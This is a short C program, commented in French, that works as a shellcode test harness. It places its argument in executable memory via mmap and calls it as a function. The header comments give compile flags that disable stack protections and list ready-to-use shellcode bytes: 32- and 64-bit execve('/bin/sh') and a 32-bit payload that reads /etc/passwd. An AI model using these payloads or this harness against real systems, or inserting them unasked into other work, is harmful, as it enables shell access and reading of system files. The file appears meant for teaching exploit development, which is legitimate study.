// Compilation : gcc -fno-stack-protector -z execstack wrapper.c -o wrapper
// Execution : ./wrapper $(echo -ne "<SHELLCODE>")
// shellcodes 32bits :
// execve("/bin/sh") : "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
// execve("cat /etc/passwd") : "\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"
// shellcodes 64bits :
// execve("/bin/sh") : "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
// L'interprétation d'un bloc de mémoire comme une fonction est dangereuse
// (et normalement impossible sans les options de compilation
// -fno-stack-protector et -z execstack), car il n'y a pas de vérification que
// la mémoire contient bien des instructions valides ou non.
// Attention de bien comprend ce que fait le shellcode avant de l'exécuter.

#include <stdio.h>
#include <sys/mman.h>
#include <string.h>

int
main(int argc, char *argv[]) {
    if (argc < 2)
    {
        fprintf(stderr, "Usage: %s <shellcode>\n", argv[0]);
        return 1;
    }

    size_t shellcode_size = strlen(argv[1]) + 1;

    // L'option "PROT_EXEC" permet de rendre la mémoire alloué à *shellcode_mem exécutable.
    void *shellcode_mem = mmap(NULL, shellcode_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (shellcode_mem == MAP_FAILED)
    {
        perror("mmap");
        return 1;
    }

    memcpy(shellcode_mem, argv[1], shellcode_size);

    /*
     * int (*func)() déclare func comme un pointeur de fonction.
     * (int(*)()) caste la variable qui suit comme une fonction sans arguments qui
     * retourne un int.
     */

    int (*func)() = (int(*)())shellcode_mem;

    /*
     * int(*func)() = (int(*)())argv[1] affecte l'emplacement mémoire du shellcode
     * passé en argument au wrapper en pointeur de fonction func.
     * func(); appelle la fonction pointée par func, qui est enfait le shellcode.
     */

    int result = func();

    munmap(shellcode_mem, shellcode_size);

    printf("Shellcode returned: %d\n", result);
    return 0;
}
